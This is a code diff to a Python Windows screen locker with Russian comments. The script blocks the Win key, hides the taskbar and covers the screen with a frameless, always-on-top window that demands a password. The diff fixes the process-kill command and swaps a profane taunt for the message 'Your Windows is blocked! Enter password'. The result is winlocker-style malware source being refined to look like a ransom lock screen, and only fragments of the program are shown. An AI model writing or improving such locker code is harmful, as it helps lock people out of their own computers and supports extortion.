@@ -3,6 +3,7 @@ from subprocess import Popen as cmd
 import sys
 import ctypes
 import winreg
+import os
 
 # Функция для блокировки клавиши Win
 def block_win_key():
@@ -71,8 +72,9 @@ def CheckPassword(arg):
         cmd("start explorer.exe", shell=True)
         try:
             quit()
-        except:
-            cmd(f"taskkill /f /in {NameFile}", shell=True)
+        except Exception as e:
+            print(f"Ошибка при закрытии окна: {e}")
+            cmd(f"taskkill /f /im {NameFile}", shell=True)
 
 # Блокировка клавиши Windows и скрытие панели задач
 block_win_key()
@@ -89,8 +91,8 @@ root.attributes("-topmost", 1)
 root.geometry(f"{X}x{Y}+{virtual_x}+{virtual_y}")  # Размещаем окно на всей доступной области
 root.overrideredirect(1)  # Убираем рамки окна
 
-Label(text="ТЫ ЗАЕБАЛ НАХОДИТЬ СПОСОБЫ!", fg="red", bg=bg, font=font).pack()
-Label(text="\n\n\n\nПОПРОБУЙ", fg="white", bg=bg, font=font).pack()
+Label(text="Ваш Windows заблокирован!", fg="red", bg=bg, font=font).pack()
+Label(text="\n\n\n\nВведите пароль", fg="white", bg=bg, font=font).pack()
 
 password = Entry(font=font)
 password.pack()
